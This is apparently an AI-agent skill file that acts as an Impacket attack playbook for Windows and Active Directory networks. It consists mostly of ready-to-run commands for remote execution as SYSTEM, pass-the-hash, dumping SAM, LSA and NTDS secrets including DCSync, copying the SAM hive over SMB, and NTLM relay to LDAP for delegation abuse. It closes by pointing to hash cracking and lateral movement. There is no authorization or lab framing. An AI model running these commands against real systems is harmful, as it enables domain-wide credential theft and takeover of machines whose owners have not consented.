---
name: tool-impacket
description: "Impacket toolkit — psexec, wmiexec, smbexec, secretsdump, GetUserSPNs, GetNPUsers, NTLM relay, SMB client, DCSync, pass-the-hash, Kerberos ticket. Triggers: 'impacket', 'secretsdump', 'psexec impacket', 'wmiexec', 'dcsync', 'ntlm relay impacket', 'pass the hash impacket', 'impacket smb', 'impacket kerberos'."
---

# Impacket Toolkit

Windows network protocol exploitation and Active Directory attacks.

---

## Phase 1: Remote Execution

```bash
TARGET="TARGET_IP"
DOMAIN="TARGET"
USER="administrator"
PASS="Password123"

# PsExec (creates service, SYSTEM):
impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null

# WMIExec (no service, less noisy):
impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null

# SMBExec (shares pipe):
impacket-smbexec "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null

# Pass-the-Hash:
HASH="aad3b435b51404eeaad3b435b51404ee:NTLM_HASH"
impacket-psexec -hashes "$HASH" "$DOMAIN/$USER@$TARGET" 2>/dev/null
impacket-wmiexec -hashes "$HASH" "$DOMAIN/$USER@$TARGET" 2>/dev/null
```

---

## Phase 2: Credential Dumping

```bash
TARGET="TARGET_IP"
DOMAIN="TARGET"
USER="administrator"
PASS="Password123"

# SecretsDump (SAM, LSA, NTDS):
impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null | tee output/secretsdump.txt

# DCSync (Domain Controller):
DC_IP="DC_IP"
impacket-secretsdump -just-dc "$DOMAIN/$USER:$PASS@$DC_IP" 2>/dev/null | tee output/dcsync.txt

# Remote SAM dump:
impacket-secretsdump -sam /tmp/SAM -security /tmp/SECURITY -system /tmp/SYSTEM LOCAL 2>/dev/null

# With pass-the-hash:
HASH="aad3b435b51404eeaad3b435b51404ee:NTLM_HASH"
impacket-secretsdump -hashes "$HASH" "$DOMAIN/$USER@$TARGET" 2>/dev/null
```

---

## Phase 3: SMB & File Operations

```bash
TARGET="TARGET_IP"
DOMAIN="TARGET"
USER="user"
PASS="Password123"

# SMB client:
impacket-smbclient "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null

# List shares:
impacket-smbclient "$DOMAIN/$USER:$PASS@$TARGET" -L 2>/dev/null

# Mount share:
impacket-smbclient "$DOMAIN/$USER:$PASS@$TARGET" 2>/dev/null << 'EOF'
shares
use C$
dir
get Windows\System32\config\SAM
EOF
```

---

## Phase 4: NTLM Relay

```bash
TARGET_LIST="targets.txt"  # Hosts without SMB signing
ATTACKER="ATTACKER_IP"

# Run Responder (listen for NTLM auth):
# responder -I eth0 -rdwv

# Run ntlmrelayx (relay captured hashes):
impacket-ntlmrelayx -tf "$TARGET_LIST" -smb2support 2>/dev/null | tee output/relay_results.txt

# LDAP relay (for RBCD, shadow credentials):
impacket-ntlmrelayx -tf "$TARGET_LIST" --no-http-server -smb2support \
  -t "ldap://DC_IP" --delegate-access 2>/dev/null
```

---

## Output

Save to `output/`:
- `secretsdump.txt` — dumped credential hashes
- `dcsync.txt` — all domain hashes via DCSync

## Next Phase

→ `tool-hashcat-john` to crack dumped hashes
→ `post-lateral-movement` using obtained credentials
